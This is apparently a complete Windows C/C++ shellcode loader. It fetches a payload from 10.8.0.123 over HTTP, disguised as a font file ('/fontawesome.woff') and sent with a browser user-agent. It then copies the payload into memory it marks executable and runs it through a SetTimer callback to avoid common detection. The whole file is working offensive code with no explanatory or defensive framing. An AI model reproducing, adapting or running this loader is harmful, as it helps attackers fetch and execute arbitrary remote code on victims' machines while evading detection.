#include <stdio.h>
#include <Windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

struct Shellcode {
	byte* data;
	DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
	HINTERNET session = InternetOpen(
		L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET connection = InternetConnect(
		session,
		host,
		port,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET request = HttpOpenRequest(
		connection,
		L"GET",
		L"/fontawesome.woff",
		NULL,
		NULL,
		NULL,
		0,
		0);

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
		//printf("Error sending HTTP request: : (%lu)\n", GetLastError()); // only for debugging

		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0); // HTTP requests eventually failed
		}
	}

	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* payload = (byte*)malloc(capacity);

	DWORD payloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			//printf("Error reading internet file : <%lu>\n", GetLastError()); // only for debugging
			exit(0);
		}

		if (bytesRead == 0) break;

		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newPayload = (byte*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}
	byte* newPayload = (byte*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	struct Shellcode out;
	out.data = payload;
	out.len = payloadSize;
	return out;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
	Shellcode shellcode = Download(L"10.8.0.123", 80);

	size_t sShellcode = shellcode.len;

    PVOID pShellcode = VirtualAlloc(NULL, sShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pShellcode == NULL) {
        printf("[-] VirtualAlloc failed with error code: %d \n", GetLastError());
    }

    memcpy(pShellcode, shellcode.data, sShellcode);

    DWORD dwOldProtect = NULL;

    if (!VirtualProtect(pShellcode, sShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        printf("[-] VirtualProtect failed with error code: %d \n", GetLastError());
    }

    UINT_PTR dummy = 0;
    MSG msg;

    SetTimer(NULL, dummy, NULL, (TIMERPROC)pShellcode);

    GetMessageW(&msg, NULL, 0, 0);

    DispatchMessageW(&msg);

	return 0;
}